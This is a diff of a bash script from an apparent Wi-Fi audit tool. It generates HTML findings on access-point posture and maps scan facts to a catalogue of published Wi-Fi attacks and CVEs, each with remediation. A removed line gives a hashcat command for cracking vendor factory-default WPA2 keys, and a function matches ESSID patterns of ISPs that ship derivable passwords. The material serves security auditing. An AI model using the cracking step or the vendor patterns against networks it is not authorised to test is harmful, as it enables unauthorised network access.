-	defaultkey-tm) printf 'CRITICAL|wpa2 factory default key recovered on a wpa3 transition ap|vendor default wpa2 psk (mac/essid keyspace) verified over the wpa2 path of a wpa3 transition ap (USENIX WOOT 2015)|candidate list from routerkeygen/hcxpsktool; hashcat -m 22000 <capture.22000> <candidates>' ;;
-	*) printf 'HIGH|key grabbed (%s)|key material grabbed in this job|see attempt log' "${1:-unknown}" ;;
-	esac
-}
-
 function _proof_for() {
 	local b="${1:-}" _hd="${HASH_DIR:-$LOG_DIR}" bflat f latest=""
 	bflat="${b//:/}"
@@ -4416,10 +4664,10 @@ function _mask_psk() {
 
 function _sev_color() {
 	case "${1:-}" in
-	CRITICAL) printf '#d92d20' ;;
-	HIGH) printf '#e8750a' ;;
-	MEDIUM) printf '#d9a406' ;;
-	LOW) printf '#2563eb' ;;
+	CRITICAL) printf '#c1121f' ;;
+	HIGH) printf '#780000' ;;
+	MEDIUM) printf '#595959' ;;
+	LOW) printf '#8a8a8a' ;;
 	*) printf '#6b7280' ;;
 	esac
 }
@@ -4457,11 +4705,11 @@ function _state_badge() {
 function _prio_badge() {
 	local c
 	case "${1:-}" in
-	Immediate) c='#d92d20' ;;
-	High) c='#e8750a' ;;
-	"Short term") c='#d9a406' ;;
-	Planned) c='#2563eb' ;;
-	"Best practice") c='#15803d' ;;
+	Immediate) c='#c1121f' ;;
+	High) c='#780000' ;;
+	"Short term") c='#595959' ;;
+	Planned) c='#595959' ;;
+	"Best practice") c='#595959' ;;
 	*) c='#6b7280' ;;
 	esac
 	printf '<span class="prio" style="color:%s;border-color:%s55">%s</span>' "$c" "$c" "$(_html_escape "${1:-}")"
@@ -4472,13 +4720,27 @@ function _fcard() {
 	local col bg
 	col="$(_sev_color "$sev")"
 	bg="$(_sev_bg "$sev")"
-	printf '<article class="finding" style="--c:%s"><div class="f-head"><div class="f-id"><span class="pill" style="color:%s;background:%s;border-color:%s33">%s</span> <span class="f-code">%s</span></div><h3>%s</h3><div class="f-meta">%s %s</div></div>' \
-		"$col" "$col" "$bg" "$col" "$(_sev_label "$sev")" "$fid" "$(_html_escape "$title")" "$(_state_badge "$sk")" "$(_prio_badge "$prio")"
+	printf '<article class="finding" data-sev="%s" style="--c:%s"><div class="f-head"><div class="f-id"><span class="pill" style="color:%s;background:%s;border-color:%s33">%s</span> <span class="f-code">%s</span></div><h3>%s</h3><div class="f-meta">%s %s</div></div>' \
+		"${sev^^}" "$col" "$col" "$bg" "$col" "$(_sev_label "$sev")" "$fid" "$(_html_escape "$title")" "$(_state_badge "$sk")" "$(_prio_badge "$prio")"
 	printf '<p class="f-desc">%s</p>' "$(_html_escape "$desc")"
 	printf '<div class="f-grid"><div><div class="f-lab">Affected networks</div><ul class="tight">%s</ul></div><div><div class="f-lab">Why it matters</div><p>%s</p></div></div>' "$aff" "$(_html_escape "$why")"
 	printf '<div class="f-grid"><div><div class="f-lab">What is confirmed</div><p>%s</p></div><div><div class="f-lab">Possible impact</div><ul class="tight">%s</ul></div></div>' "$(_html_escape "$stext")" "$imp"
 	printf '<div class="f-rec"><div class="f-lab">Recommendation</div><p>%s</p><div class="f-lab" style="margin-top:8px">How to verify the fix</div><p>%s</p></div>' "$(_html_escape "$rec")" "$(_html_escape "$verify")"
 	printf '<details class="f-tech" open><summary>Technical details</summary><ul class="mono tech">%s</ul></details></article>' "$tech"
+}
+
+function _gate_sev() {
+	case "${1^^}" in
+	INFO) printf 'INFO' ;;
+	*) printf 'LOW' ;;
+	esac
+}
+
+function _count_sev() {
+	local n
+	n=$(printf '%s' "${1:-}" | grep -o "data-sev=\"${2}\"" | wc -l) || n=0
+	n="${n//[!0-9]/}"
+	printf '%s' "${n:-0}"
 }
 
 function _li_esc() {
@@ -4589,16 +4851,438 @@ function _write_finding_proof() {
 	printf '%s' "$f"
 }
 
+posture_scan_targets() {
+	local rec b
+	local -A seen=()
+	for rec in ${FOUND_TARGETS[@]+"${FOUND_TARGETS[@]}"}; do
+		b="${rec%%|*}"
+		[[ -n "$b" ]] || continue
+		[[ -n "${seen[$b]:-}" ]] && continue
+		seen["$b"]=1
+		printf '%s\n' "$b"
+	done
+}
+
+# Detection only: does the ESSID match a vendor/ISP known to ship a WPA2 password
+# derived from the device MAC/serial? Returns the vendor label, rc1 if not.
+# shortcut: pattern list, extend as new default-credential vendors appear.
+function _essid_default_scheme() {
+	local e="${1:-}"
+	case "$e" in
+	UPC[0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f]*) printf 'UPC' ;;
+	PLAY_Swiatlowodowy_* | PLAY[0-9][0-9]*) printf 'Play' ;;
+	Orange_Swiatlowod* | Orange-[0-9A-Fa-f]*) printf 'Orange' ;;
+	T-Mobile_Swiatlowod* | TMPL[0-9]*) printf 'T-Mobile' ;;
+	TP-LINK_[0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f]) printf 'TP-Link' ;;
+	*) return 1 ;;
+	esac
+}
+
+build_posture_findings() {
+	local b essid akm rsnxe pmfm li out="" _hit
+	local defpsk_aff="" defpsk_n=0 _defsch
+	local pmf_aff="" nowpa3_aff="" ent_aff="" saepk_aff=""
+	local pmf_n=0 nowpa3_n=0 ent_n=0 saepk_n=0
+	local ssidc_aff="" legacy_aff="" trans_aff="" tkip wpa1 rsncaps pmfraw
+	local ssidc_n=0 legacy_n=0 trans_n=0
+	local pmf_ev="" nowpa3_ev="" ent_ev="" saepk_ev="" ssidc_ev="" legacy_ev="" trans_ev="" defpsk_ev=""
+	POSTURE_HTML=""
+	POSTURE_NEW=()
+	while IFS= read -r b; do
+		[[ -n "$b" ]] || continue
+		if [[ "${ENABLE_REPORT_DEDUP:-1}" == "1" ]] && report_state_seen "${REPORT_STATE_POSTURE:-}" "$b"; then
+			continue
+		fi
+		essid="$(_sar_field "$b" essid)"
+		[[ -n "$essid" ]] || essid="hidden"
+		akm="$(_sar_field "$b" akm_list)"
+		rsnxe="$(_sar_field "$b" rsnxe_list)"
+		pmfm="$(_sar_field "$b" pmf_mode)"
+		tkip="$(_sar_field "$b" tkip)"
+		wpa1="$(_sar_field "$b" wpa1)"
+		rsncaps="$(_sar_field "$b" rsn_caps)"
+		pmfraw="$(_sar_field "$b" pmf_raw)"
+		li="<li>$(_html_escape "${essid} (${b})")</li>"
+		_hit=0
+		if [[ -n "$akm" && "$pmfm" != "req" ]]; then
+			pmf_aff+="$li"
+			pmf_ev+="<li>$(_html_escape "${b} pmf_mode=${pmfm:-?} pmf_raw=${pmfraw:-?} rsn_caps=${rsncaps:-?}")</li>"
+			pmf_n=$((pmf_n + 1))
+			_hit=1
+		fi
+		if [[ ",${akm}," == *,PSK,* && ",${akm}," != *,SAE,* ]]; then
+			nowpa3_aff+="$li"
+			nowpa3_ev+="<li>$(_html_escape "${b} akm=${akm:-?}")</li>"
+			nowpa3_n=$((nowpa3_n + 1))
+			_hit=1
+		fi
+		if is_wpa_enterprise "$akm"; then
+			ent_aff+="$li"
+			ent_ev+="<li>$(_html_escape "${b} akm=${akm:-?}")</li>"
+			ent_n=$((ent_n + 1))
+			_hit=1
+			# (2) Enterprise 802.1X: the EAP method is negotiated after association and
+			# is not in the beacon, so this is a possible EAP-pwd pre-auth surface, not confirmed.
+			print_log WARN SURFACE "enterprise surface"
+		fi
+		# (1) ISP/vendor factory-default WPA2 scheme (ESSID pattern), PSK networks only.
+		_defsch="$(_essid_default_scheme "$essid" 2>/dev/null)" || _defsch=""
+		if [[ -n "$_defsch" && ",${akm}," == *,PSK,* && ",${akm}," != *,802.1X,* ]]; then
+			defpsk_aff+="$li"
+			defpsk_ev+="<li>$(_html_escape "${b} essid=${essid} scheme=${_defsch} akm=${akm:-?}")</li>"
+			defpsk_n=$((defpsk_n + 1))
+			_hit=1
+			print_log WARN SURFACE "default scheme"
+		fi
+		if [[ ",${rsnxe}," == *,SAE-PK,* ]]; then
+			saepk_aff+="$li"
+			saepk_ev+="<li>$(_html_escape "${b} rsnxe=${rsnxe:-?}")</li>"
+			saepk_n=$((saepk_n + 1))
+			_hit=1
+		fi
+		if [[ "${ENABLE_POSTURE_EXT:-1}" == "1" ]]; then
+			if [[ -n "$akm" ]] && { [[ ",${akm}," == *,802.1X,* ]] || [[ ",${akm}," == *,FILS* ]] || { [[ ",${akm}," == *,SAE,* ]] && [[ ",${rsnxe}," != *,SAE-H2E,* ]]; }; }; then
+				ssidc_aff+="$li"
+				ssidc_ev+="<li>$(_html_escape "${b} akm=${akm:-?} rsnxe=${rsnxe:-?}")</li>"
+				ssidc_n=$((ssidc_n + 1))
+				_hit=1
+			fi
+			if [[ "$tkip" == "YES" || "$wpa1" == "YES" ]]; then
+				legacy_aff+="$li"
+				legacy_ev+="<li>$(_html_escape "${b} tkip=${tkip:-?} wpa1=${wpa1:-?}")</li>"
+				legacy_n=$((legacy_n + 1))
+				_hit=1
+			fi
+			if [[ ",${akm}," == *,SAE,* && ",${akm}," == *,PSK,* ]]; then
+				trans_aff+="$li"
+				trans_ev+="<li>$(_html_escape "${b} akm=${akm:-?}")</li>"
+				trans_n=$((trans_n + 1))
+				_hit=1
+			fi
+		fi
+		((_hit == 1)) && POSTURE_NEW+=("$b")
+	done < <(posture_scan_targets)
+
+	if ((pmf_n > 0)); then
+		out+="$(_fcard LOW "F-PMF" "Management frames not protected (PMF / 802.11w not required)" beacon "From the beacon: the PMF required bit is not set." "Short term" "Without required PMF a deauth frame still works, which helps capture the WPA2 handshake and push clients to a rogue AP, and aggravates power-save queue frame leaks." "$pmf_aff" "An attacker can deauth clients, grab the handshake for an offline crack, and run denial of service." "$(_li_esc "handshake capture for offline crack" "deauth denial of service" "easier evil-twin coercion")" "Set PMF to required (WPA3), or at least capable, on every network." "Re-scan: the beacon RSN capabilities must show PMF required." "${pmf_ev}$(_li_esc "standard: IEEE 802.11w" "context: Framing Frames, USENIX 2023" "taxonomy: CWE-320")")"
+	fi
+	if ((nowpa3_n > 0)); then
+		out+="$(_fcard LOW "F-NOWPA3" "No WPA3 SAE (WPA2-PSK only)" config "From the AKM list: PSK present, SAE absent." "Best practice" "WPA2-PSK only: a captured handshake or PMKID can be run through an offline dictionary crack. WPA3 SAE closes that path." "$nowpa3_aff" "A weak WPA2 passphrase can be cracked offline." "$(_li_esc "offline dictionary crack on a captured handshake" "weaker than WPA3 against offline attacks")" "Enable WPA3 SAE (transition mode if old clients remain). Use a long random passphrase." "Re-scan: the network must advertise WPA3 SAE." "${nowpa3_ev}$(_li_esc "class: weak crypto posture (CWE-326)")")"
+	fi
+	if ((ent_n > 0)); then
+		out+="$(_fcard LOW "F-ENT" "Enterprise Wi-Fi (802.1X): client credential-theft exposure" config "From the AKM list: 802.1X enterprise. Posture only; client validation is not tested here." "Short term" "If clients do not validate the RADIUS server certificate or lack an anonymous outer identity, a rogue AP with the same SSID can capture their credentials; many clients also send the username in plaintext, which enables tracking." "$ent_aff" "Credential theft via evil twin and username tracking, even under MAC randomization." "$(_li_esc "EAP credential theft via rogue AP" "username tracking from a plaintext identity")" "Enforce server-certificate validation (CA plus server name) in client profiles; use an anonymous outer identity; consider EAP-pwd or EAP-TLS." "Check client EAP profiles pin the CA and server name, and that the outer identity is anonymous." "${ent_ev}$(_li_esc "refs: Enterprise cert misconfig, CSNET 2025; Secure TOFU, WiSec 2026" "class: Evil-Twin EAP credential theft (CWE-295)" "note: posture from AKM; the exposure is client-side, verify on clients")")"
+	fi
+	if ((saepk_n > 0)); then
+		out+="$(_fcard LOW "F-SAEPK" "WPA3 SAE-PK hotspot: precomputation exposure if weak Sec or shared SSID" config "From RSNXE: SAE-PK advertised. The Sec parameter is not visible in the beacon." "Best practice" "SAE-PK password strength depends on the Sec parameter and on SSID uniqueness. A low Sec value, or an SSID reused across many hotspots, lowers the cost of time-memory-tradeoff precomputation of the hotspot password." "$saepk_aff" "Over time an attacker could precompute the hotspot password; this remains computationally expensive." "$(_li_esc "time-memory-tradeoff precomputation of the SAE-PK password" "cheaper when the SSID is reused widely")" "Use a Sec value of 5 or higher and a unique SSID per deployment." "Confirm the SAE-PK Sec parameter is 5 or higher and the SSID is unique." "${saepk_ev}$(_li_esc "refs: SAE-PK TMTO, APKC 2022; WPA3-PK analysis, ACNS 2024 (Vanhoef)" "note: advisory posture, not a fast attack")")"
+	fi
+	if ((ssidc_n > 0)); then
+		out+="$(_fcard LOW "F-SSIDCONF" "SSID not authenticated: client can be tricked onto the wrong protected network" config "From the AKM list / RSNXE: 802.1X, or WPA3-SAE without Hash-to-Element (SAE-loop). These do not bind the SSID into the key, so a multi-channel machine-in-the-middle can rewrite the SSID a client sees." "Short term" "When the SSID is not authenticated, a victim intending to join TrustedNet can be driven onto a different network using similar credentials, and apps that trust an SSID (for example auto-disabling a VPN) can be fooled." "$ssidc_aff" "Client is connected to a different network than it displays; possible VPN auto-disable and traffic interception." "$(_li_esc "connect-to-wrong-network (SSID confusion)" "VPN auto-disable on a trusted-SSID match" "band downgrade to a weaker 2.4 GHz SSID")" "Prefer WPA3-SAE with Hash-to-Element (SAE-const); enable beacon protection (mandatory from Wi-Fi 7); avoid reusing the same credentials across different SSIDs." "Re-scan: WPA3 networks should advertise SAE-H2E; confirm beacon protection is enabled." "${ssidc_ev}$(_li_esc "ref: SSID Confusion, WiSec 2024, CVE-2023-52424 (Table 1: SAE-loop / 802.1X vulnerable, SAE-const / WPA2 not)" "class: rogue-AP / evil twin (CWE-290)" "note: posture from AKM+RSNXE; the attack is client-side")")"
+	fi
+	if ((legacy_n > 0)); then
+		out+="$(_fcard LOW "F-LEGACY" "Legacy cipher in use (TKIP / WPA1)" beacon "From the beacon: TKIP pairwise/group cipher or a WPA1 element is present." "Short term" "TKIP (RC4 + Michael) is broken: practical side-channel and Beck-Tews-class attacks allow packet decryption and limited injection, and RC4 keystream biases are exploitable." "$legacy_aff" "Partial traffic decryption and packet injection against TKIP-protected frames." "$(_li_esc "WPA-TKIP packet decryption / injection" "RC4 keystream bias exploitation")" "Disable TKIP and WPA1; use CCMP/GCMP (WPA2/WPA3) only. If TKIP is required for old clients, set a short group-rekey interval." "Re-scan: the network must offer CCMP/GCMP only, with no TKIP or WPA1 element." "${legacy_ev}$(_li_esc "refs: Practical Side-Channel Attacks against WPA-TKIP, AsiaCCS 2019; RC4 NOMORE, USENIX 2015" "class: use of broken crypto (CWE-327)")")"
+	fi
+	if ((trans_n > 0)); then
+		out+="$(_fcard LOW "F-TRANSITION" "WPA3 transition mode (SAE+PSK): forced WPA2 downgrade" config "From the AKM list: both SAE and PSK are offered on the same network, i.e. WPA3 transition mode." "Short term" "In transition mode an AP accepts WPA2-PSK with the same password; an attacker can force a client down to WPA2 and then capture a handshake for an offline dictionary attack, defeating the WPA3 SAE protection." "$trans_aff" "Downgrade to WPA2 then offline dictionary attack on the shared passphrase." "$(_li_esc "forced WPA2 downgrade in transition mode" "offline dictionary attack after downgrade")" "Disable transition mode once clients support WPA3, or split WPA2 and WPA3 into separate SSIDs; require PMF; use a long random passphrase." "Re-scan: the WPA3 network must not also advertise WPA2-PSK on the same SSID." "${trans_ev}$(_li_esc "ref: Dragonblood (IEEE S&P 2020), section 4.1 transition-mode downgrade; CVE-2019-9494 class" "class: protocol downgrade (CWE-757)")")"
+	fi
+	if ((defpsk_n > 0)); then
+		out+="$(_fcard LOW "F-DEFAULTPSK" "Factory-default WPA2 password scheme (ISP/vendor)" config "From the ESSID pattern: the network name matches a vendor/ISP that ships a WPA2 password derived from the device MAC/serial (UPC, Play, Orange, T-Mobile, TP-Link). Detection only - the key is not recovered here." "Immediate" "If the owner never changed the factory password it is derivable from public data (BSSID/ESSID) and recoverable offline in seconds from a captured PMKID or handshake, giving full network access. Critical risk class while the default stands." "$defpsk_aff" "Full Wi-Fi access if the factory password is unchanged; recoverable in seconds offline." "$(_li_esc "offline recovery of an unchanged factory WPA2 password" "full network access")" "Change the Wi-Fi password to a long random passphrase not derived from the MAC or ESSID." "Re-scan after changing the password; the default-scheme ESSID may remain but the key must no longer be a factory default." "${defpsk_ev}$(_li_esc "class: use of default/derivable credentials (CWE-1392, CWE-330)" "ref: default-key keyspace, USENIX WOOT 2015" "note: posture from ESSID pattern; not a confirmed crack")")"
+	fi
+	POSTURE_HTML="$out"
+	return 0
+}
+
+function _corpus_detect() {
+	local token="$1" akm="$2" rsnxe="$3" pmf="$4" tkip="$5" wpa1="$6" wps="$7" chip="$8" maker="$9"
+	case "$token" in
+	mediatek) [[ "${chip,,}" == *mediatek* || "${maker,,}" == *mediatek* || "${chip,,}" == *ralink* ]] ;;
+	sae) [[ ",${akm}," == *,SAE,* || ",${akm}," == *,SAE-EXT-KEY,* || ",${akm}," == *,FT-SAE,* ]] ;;
+	pmf_off) [[ -n "$akm" && "$pmf" != "req" ]] ;;
+	open) [[ -z "$akm" ]] ;;
+	tkip) [[ "$tkip" == "YES" || "$wpa1" == "YES" ]] ;;
+	ent) is_wpa_enterprise "$akm" ;;
+	wps) [[ -n "$wps" && "$wps" != "unknown" ]] ;;
+	psk) [[ ",${akm}," == *,PSK,* || ",${akm}," == *,PSK-SHA256,* || ",${akm}," == *,FT-PSK,* ]] ;;
+	protected) [[ -n "$akm" ]] ;;
+	saepk) [[ ",${rsnxe}," == *,SAE-PK,* ]] ;;
+	saeorent) [[ ",${akm}," == *,SAE,* ]] || is_wpa_enterprise "$akm" ;;
+	any) return 0 ;;
+	*) return 1 ;;
+	esac
+}
+
+function _corpus_meta() {
+	cat <<'CORPUS_EOF'
+COR-A12|HIGH|High|mediatek|CVE-2018-14525|MediaTek EAPOL-Key parsing: client memory corruption from a malicious AP|Update MediaTek Wi-Fi firmware and driver to a patched build.|ref: WiFuzz, WOOT 2018; one crafted EAPOL-Key frame; class CWE-787
+COR-B5|MEDIUM|Medium|sae|n/a|SAE anti-clogging bypass: access-point CPU exhaustion (DoS)|Enable SAE commit rate limiting and anti-clogging; patch hostapd; monitor AP CPU.|ref: Dragonblood, IEEE S&P 2020 sec.5; 8-70 commit/s to 100 percent CPU; class CWE-400
+COR-C9|HIGH|High|pmf_off|n/a|Framing Frames: queued frames can leak when management frames are unprotected|Require PMF (802.11w) or WPA3; patch transmit-queue handling.|ref: Framing Frames, USENIX 2023; a few frames; class CWE-319
+COR-D5|MEDIUM|Medium|open|n/a|Open or captive hotspot: paid-session hijack via MAC spoofing (Piso-WiFi)|Do not bind sessions to MAC alone; use per-client keys or WPA3; harden the portal.|ref: SPAIC 2026; a single MAC spoof; class CWE-290
+COR-E1|MEDIUM|Medium|tkip|n/a|TKIP MIC-failure DoS: QoS-channel replay disables TKIP for about one minute|Disable TKIP and WPA1; use CCMP/GCMP only.|ref: AsiaCCS 2013; two frames per minute; class CWE-400
+COR-F4|LOW|Low|ent|n/a|Enterprise EAP: outer identity sent in cleartext enables user tracking|Configure an anonymous outer identity in client EAP profiles.|ref: CSNet 2025; one EAP-Identity exchange; class CWE-359
+COR-G2|LOW|Low|wps|n/a|WPS UUID reveals the real MAC (deanonymization under MAC randomization)|Disable WPS; omit or randomize the WPS UUID.|ref: AsiaCCS 2016; one probe or UUID; class CWE-200
+COR-A7|HIGH|High|psk|n/a|KRACK key-reinstallation exposure (4-way handshake; msg4 replay on some clients)|Patch client and AP supplicant/hostapd to post-2017 KRACK fixes; require PMF.|ref: KRACK, CCS 2017 and CCS 2018 msg4 variant; one replayed frame on vulnerable stacks; class CWE-323
+COR-A9|CRITICAL|High|psk|n/a|Plaintext-injection exposure via forged Group Msg1 on a nulled PTK (OpenBSD-class clients)|Update client supplicant; reject group message before the 4-way completes.|ref: WiFuzz, Black Hat and AsiaCCS 2017; two frames after association; class CWE-325
+COR-B1|CRITICAL|High|ent|CVE-2019-9498, 9499, 11235|EAP-pwd invalid-curve: authentication bypass and server impersonation|Patch hostapd/wpa_supplicant EAP-pwd; validate curve points.|ref: Dragonblood, IEEE S&P 2020; one handshake; class CWE-327
+COR-B2|HIGH|High|saeorent|CVE-2019-9497, 11234|Reflection attack in EAP-pwd and SAE (login as victim; rogue AP completes handshake)|Patch to reflection-resistant EAP-pwd/SAE; require PMF.|ref: Dragonblood; one handshake; class CWE-287
+COR-B4|MEDIUM|Medium|sae|n/a|SAE group downgrade via a forged unsupported-group commit|Patch SAE to reject spoofed group rejection; restrict allowed groups.|ref: Dragonblood; a few frames at connect; class CWE-757
+COR-B11|HIGH|Medium|saepk|n/a|WPA3-PK: an insider without client isolation runs LAN MitM against peers|Enforce client isolation and per-client VLANs on SAE-PK hotspots.|ref: WPA3-PK analysis, ACNS 2024; standard LAN attacks; class CWE-923
+COR-B12|MEDIUM|Medium|sae|CVE-2025-20664|SAECRED: Rejected-Groups parsing flaw enables SAE group downgrade|Patch SAE (hostapd and MediaTek) Rejected-Groups handling.|ref: SAECRED, IEEE S&P 2025; a few frames; class CWE-757
+COR-B13|MEDIUM|Medium|sae|CVE-2025-20664|SAECRED: Password-Identifier state poisoning causes a long-lived client DoS|Patch SAE Password-Identifier state handling.|ref: SAECRED, IEEE S&P 2025; one frame; class CWE-400
+COR-C4|HIGH|High|protected|CVE-2020-26140, 26143, 26144, 26145|FragAttacks: acceptance of plaintext frames (A-MSDU posing as EAPOL) enables injection|Patch clients and APs for FragAttacks (2021); drop plaintext data frames.|ref: FragAttacks, USENIX 2021; one frame on vulnerable stacks; class CWE-345
+COR-C8|HIGH|High|protected|CVE-2021-36196, 36197|FragAttacks: smartphones accept plaintext frames during the handshake|Update affected mobile firmware (FragAttacks fixes).|ref: WiSec 2023 frame-injection testing; one frame; class CWE-345
+COR-C10|MEDIUM|Medium|protected|n/a|Framing Frames: a forged power-save bit queues frames and disconnects the client (works in WPA3)|Patch AP transmit-queue handling; monitor for forged power-save frames.|ref: Framing Frames, USENIX 2023; a few frames; class CWE-400
+COR-C11|HIGH|Medium|protected|CVE-2022-47522|MacStealer: security-context override lets an insider receive a victim's frames (isolation bypass)|Enforce per-client keying and isolation; patch AP; require PMF.|ref: Framing Frames / MacStealer, USENIX 2023; reconnection window; class CWE-300
+COR-D1|HIGH|High|protected|n/a|Group-key (GTK) abuse: unicast injection and ARP poisoning decrypt all traffic|Isolate clients; short group-rekey; L3 client-to-client blocking.|ref: Abusing WPA2 Group Keys, USENIX 2016; a few frames after GTK; class CWE-300
+COR-D2|HIGH|High|protected|n/a|AirSnitch: GTK abuse injects frames to isolated clients (also Passpoint)|Per-client VLAN/SSID; L3 isolation; patch AP.|ref: AirSnitch, NDSS 2026; one frame; class CWE-923
+COR-D3|HIGH|High|protected|n/a|AirSnitch gateway bouncing: L2-only isolation bypassed via the gateway MAC|Enforce isolation at L3 on the gateway; anti-spoofing.|ref: AirSnitch, NDSS 2026; one packet; class CWE-923
+COR-D4|HIGH|High|protected|n/a|AirSnitch: victim and gateway MAC spoofing yields full two-way MitM|L3 isolation; ARP/IP spoof guards; per-client keys.|ref: AirSnitch, NDSS 2026; connection window; class CWE-300
+COR-D6|MEDIUM|Medium|open|n/a|Captive hotspot impersonation (fake Piso-WiFi) grants free access|Authenticated portal; per-client keys or WPA3; signed captive pages.|ref: SPAIC 2026; impersonation at connect; class CWE-290
+COR-E2|MEDIUM|Medium|tkip|n/a|Spurious TKIP countermeasures accepted on a CCMP network (permanent DoS or crash on some APs)|Patch AP to ignore TKIP MIC reports without TKIP; disable TKIP.|ref: WiFuzz, Black Hat and AsiaCCS 2017; two reports; class CWE-20
+COR-E3|MEDIUM|High|psk|n/a|Forged MIC-failure reports on a nulled PTK cause persistent AP DoS (OpenBSD-class)|Patch AP supplicant; require PMF; validate the MIC-failure source.|ref: WiFuzz, Black Hat 2017; two frames; class CWE-287
+COR-E4|MEDIUM|Medium|psk|n/a|Spoofed association requests on behalf of a victim cause targeted DoS (Windows-7-class AP)|Patch AP; require PMF; rate-limit association.|ref: WiFuzz, Black Hat 2017; two frames; class CWE-287
+COR-E5|MEDIUM|Medium|pmf_off|n/a|Forged msg2 with a random SNonce aborts the 4-way handshake (SNonce poisoning)|Patch the AP 4-way state machine; require PMF.|ref: WiFuzz, Black Hat 2017; one frame; class CWE-287
+COR-E6|MEDIUM|Medium|pmf_off|n/a|4-way handshake DoS: blocked msg4, early PTK install, or a malformed msg1 on rekey|Patch supplicant/AP handshake handling; require PMF.|ref: DoS against the 4-way handshake, NCS 2017; a few frames; class CWE-287
+COR-E7|MEDIUM|High|any|n/a|Radio jamming is an inherent availability risk (continuous or selective); no configuration fix|Deploy spectrum monitoring and physical controls; plan for RF availability loss.|ref: Advanced Wi-Fi attacks, ACSAC 2014; inherent RF denial of service, not performed by this tool; class CWE-400
+COR-E8|LOW|Medium|any|n/a|Selfish MAC-layer access can starve other stations of airtime|Monitor airtime fairness; detect non-compliant stations.|ref: Advanced Wi-Fi attacks, ACSAC 2014; inherent MAC behavior; class CWE-400
+COR-E9|MEDIUM|Medium|pmf_off|n/a|Beacon forgery degrades TX power, delays transmit, drains battery, or drops group frames|Enable beacon protection (Wi-Fi 7); require PMF.|ref: Protecting Wi-Fi Beacons, WiSec 2020; a few beacons; class CWE-290
+COR-E10|MEDIUM|Medium|pmf_off|n/a|Client disconnection despite MFP via handshake gaps, a malformed 4-way, or protected-frame replay|Patch supplicant MFP handling; keep firmware current.|ref: Robustness of deauth countermeasures, WiSec 2022; class CWE-287
+COR-E11|MEDIUM|Medium|pmf_off|n/a|Client disconnection despite MFP via forged beacon/CSA/EAPoL-Logoff/EAP-Failure|Patch client CSA and EAP handling; enable beacon protection.|ref: Robustness of deauth countermeasures, WiSec 2022; class CWE-290
+COR-E12|MEDIUM|High|pmf_off|CVE-2019-16275|hostapd broadcast-address association request triggers a protected broadcast deauth (all clients drop)|Update hostapd past CVE-2019-16275.|ref: WiSec 2021 demo framework; two frames; class CWE-20
+COR-E13|MEDIUM|Medium|protected|n/a|iwd integer overflow in EAPOL-Key crashes the iwd daemon|Update iwd to a patched release.|ref: WOOT 2018 symbolic execution; one frame; class CWE-190
+COR-G4|LOW|Low|any|n/a|Fake SSIDs and Hotspot 2.0 ANQP can elicit the device's real MAC despite randomization|Disable auto-join to unknown SSIDs; limit ANQP responses.|ref: MAC randomization is not enough, AsiaCCS 2016; at connect; class CWE-200
+COR-G7|LOW|Low|protected|n/a|AP handshake-implementation fingerprinting from EAPOL-Key fields|Not directly fixable; be aware of implementation disclosure.|ref: WiFuzz, AsiaCCS and Black Hat 2017; one handshake; class CWE-200
+CORPUS_EOF
+}
+
+function build_corpus_findings() {
+	CORPUS_HTML=""
+	[[ "${ENABLE_CORPUS_POSTURE:-1}" == "1" ]] || return 0
+
+	local -A AFF=() CNT=()
+	local b essid akm rsnxe pmf tkip wpa1 wps chip maker li
+	local id sev eff token cve title fix ref out=""
+
+	while IFS= read -r b; do
+		[[ -n "$b" ]] || continue
+		essid="$(_sar_field "$b" essid)"
+		[[ -n "$essid" ]] || essid="hidden"
+		akm="$(_sar_field "$b" akm_list)"
+		rsnxe="$(_sar_field "$b" rsnxe_list)"
+		pmf="$(_sar_field "$b" pmf_mode)"
+		tkip="$(_sar_field "$b" tkip)"
+		wpa1="$(_sar_field "$b" wpa1)"
+		wps="$(_sar_field "$b" wps_state)"
+		chip="$(_sar_field "$b" chip)"
+		maker="$(_sar_field "$b" maker)"
+		li="<li>$(_html_escape "${essid} (${b})")</li>"
+		while IFS='|' read -r id sev eff token cve title fix ref; do
+			[[ -n "$id" ]] || continue
+			if _corpus_detect "$token" "$akm" "$rsnxe" "$pmf" "$tkip" "$wpa1" "$wps" "$chip" "$maker"; then
+				AFF["$id"]+="$li"
+				CNT["$id"]=$((${CNT["$id"]:-0} + 1))
+			fi
+		done < <(_corpus_meta)
+	done < <(posture_scan_targets)
+
+	while IFS='|' read -r id sev eff token cve title fix ref; do
+		[[ -n "$id" ]] || continue
+		((${CNT["$id"]:-0} > 0)) || continue
+		out+="$(_fcard "$(_gate_sev "$sev")" "$id" "$title" config "Posture from scan facts (academic-corpus mapping); exposure is often client- or firmware-side, verify before citing." "Short term" "$title. Advisory exposure mapped from the attack corpus (see reference); not an executed exploit." "${AFF[$id]}" "Exposure to the referenced published attack; real risk depends on firmware and client behavior." "$(_li_esc "see reference and CVE" "effectiveness: $eff")" "$fix" "Re-scan after the fix or firmware update and confirm the triggering condition no longer holds." "$(_li_esc "advisory corpus rating: $sev (posture, not executed in this scan)" "corpus id: $id" "CVE: $cve" "effectiveness: $eff" "$ref")")"
+	done < <(_corpus_meta)
+
+	out+="$(_fcard INFO "COR-NOTE-HI" "Out-of-radio-scope corpus items (VPN, tunnels, web): client-side notes" config "Not observable from Wi-Fi beacons; listed as advisory notes per scope." "Best practice" "These corpus attacks target client or software posture, not the radio, so the Wi-Fi scan cannot detect them. Assess them on endpoints." "<li>client-side (no specific BSSID)</li>" "Endpoint or software exposure, not a Wi-Fi radio finding." "$(_li_esc "H1 TunnelCrack LocalNet (CVE-2023-36672, 35838), effectiveness High" "H3 open tunnelling hosts (CVE-2024-7595 et al.), effectiveness High" "H4 tunnel amplification DoS, effectiveness High" "I2 cross-origin resource-size leak, effectiveness Medium" "G8 WireGuard implementation fingerprint, effectiveness Low")" "Patch VPN clients (TunnelCrack); restrict and patch tunnelling hosts; keep browsers updated." "Verify VPN-client and tunnel-host patch levels on endpoints." "$(_li_esc "scope: endpoint and software, not radio" "note: cannot be detected from a Wi-Fi scan")")"
+
+	CORPUS_HTML="$out"
+	return 0
+}
+
+function _report_channel_chart() {
+	local sar="${LOG_DIR}/sar.jsonl"
+	[[ -r "$sar" ]] || {
+		printf '<div class="panel"><p class="sub">No channel data.</p></div>'
+		return 0
+	}
+	local -A cnt=()
+	local ch
+	while IFS= read -r ch; do
+		[[ "$ch" =~ ^[0-9]+$ ]] || continue
+		cnt["$ch"]=$((${cnt["$ch"]:-0} + 1))
